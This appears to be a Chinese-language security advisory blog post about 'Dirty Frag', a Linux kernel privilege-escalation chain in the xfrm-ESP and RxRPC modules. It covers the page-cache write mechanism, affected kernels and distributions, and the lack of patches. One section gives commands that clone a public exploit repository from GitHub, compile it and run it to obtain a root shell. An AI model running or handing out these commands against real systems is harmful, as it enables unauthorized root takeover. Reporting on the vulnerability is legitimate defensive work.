#  Dirty Frag：Linux 史诗级通用提权漏洞链，全发行版沦陷  
原创 MobSec
                    MobSec  莫白AI安全团队   2026-05-08 03:22  
  
继 Dirty Pipe、Copy Fail 之后，Linux 内核再曝**致命本地提权漏洞家族 Dirty Frag**  
。该漏洞由安全研究员 Hyunwoo Kim（@v4bel）发现并公开 PoC，通过**双内核漏洞链式利用**  
，可在**几乎所有主流 Linux 发行版**  
上将普通用户一键提升为 root，且**无需竞争条件、不挑环境、成功率接近 100%**  
。  
  
更危险的是：因披露禁令被提前打破，**目前全平台无官方补丁、无 CVE 编号**  
，只能通过禁用内核模块临时缓解。  
## 一、漏洞核心概况  
- • **漏洞名称**  
：Dirty Frag（Universal Linux LPE）  
  
- • **漏洞类型**  
：Linux 内核本地提权（LPE）  
  
- • **危害等级**  
：**超临界**  
  
- • **利用条件**  
：本地普通用户权限  
  
- • **利用难度**  
：极低（一行命令提权）  
  
- • **是否需要竞争**  
：**不需要**  
（纯逻辑漏洞）  
  
- • **失败影响**  
：**不宕机、不内核崩溃**  
  
- • **公开状态**  
：PoC 已完全开源（GitHub 已发布 exp.c）  
  
## 二、为什么叫 Dirty Frag？  
  
它属于 **Dirty Pipe / Copy Fail**  
 同一系列漏洞家族：  
  
通过破坏内核 sk_buff  
（网络套接字缓冲区）的 frag  
 页片段管理，**篡改只读文件的页缓存（Page Cache）**  
，实现无权限写文件、进而提权。  
  
名字中的 **Frag**  
 直接指向漏洞根源：**skb 片段页缓存写异常**  
。  
## 三、两条致命漏洞链（互补覆盖全平台）  
  
Dirty Frag 不是单个漏洞，而是**两条漏洞互补联动**  
，实现 “全发行版通杀”。  
### 1. xfrm-ESP Page-Cache Write（2017 年引入，潜伏 9 年）  
- • 引入时间：2017-01-17（commit cac2661c53f3）  
  
- • 位置：IPsec ESP 模块（esp4/esp6）  
  
- • 能力：任意 4 字节内存写  
  
- • 限制：需要创建用户命名空间  
  
- • 影响：**99% Linux 默认开启**  
  
### 2. RxRPC Page-Cache Write（2023 年引入）  
- • 引入时间：2023-06（commit 2dc334f1a63a）  
  
- • 位置：RxRPC 网络模块  
  
- • 能力：页缓存原地改写  
  
- • 限制：**无需命名空间**  
  
- • 特点：Ubuntu 默认加载，专治 AppArmor 限制  
  
### 链式逻辑（1+1>2）  
- • xfrm 覆盖大部分系统  
  
- • RxRPC 覆盖 Ubuntu 等被限制环境  
组合后实现真正全平台通杀  
  
## 四、技术原理（极简版）  
1. 1. 利用 **零拷贝（zero-copy）**  
 机制，将只读文件页缓存映射到 skb 片段  
  
1. 2. 内核在**解密流程中对只读页执行原地改写**  
  
1. 3. 攻击者可控改写内容  
  
1. 4. 篡改 /etc/passwd  
、suid 程序等，直接获得 root  
  
关键点：  
  
**只读页 → 进入网络缓冲区 → 被内核加密操作改写 → 提权**  
。  
## 五、影响范围（几乎所有现代 Linux）  
### 受影响内核版本  
- • xfrm-ESP：**2017.1 ~ 最新主线内核**  
  
- • RxRPC：**2023.6 ~ 最新主线内核**  
  
### 已验证可提权发行版  
- • Ubuntu 24.04.4  
  
- • RHEL 10.1  
  
- • CentOS Stream 10  
  
- • AlmaLinux 10  
  
- • Fedora 44  
  
- • openSUSE Tumbleweed  
  
- • 内核版本最高至 **7.0.x**  
  
### 关键特性：无视 Copy Fail 防护  
  
即使你已修复 Copy Fail（黑名单 algif_aead），**依然会被 Dirty Frag 击穿**  
  
两者利用路径完全独立。  
## 六、一键提权命令（PoC 已公开）  
```
git clone https://github.com/V4bel/dirtyfrag.git
cd dirtyfrag
gcc -O0 -Wall -o exp exp.c -lutil
./exp

```  
  
执行即获得 **root shell**  
。  
## 七、官方现状：无补丁、无 CVE  
  
因**披露禁令被第三方破坏**  
，漏洞被迫提前公开。  
  
截至目前：  
- • 无任何官方补丁  
  
- • 无 CVE 编号  
  
- • 所有发行版均处于裸奔状态。  
  
  
  
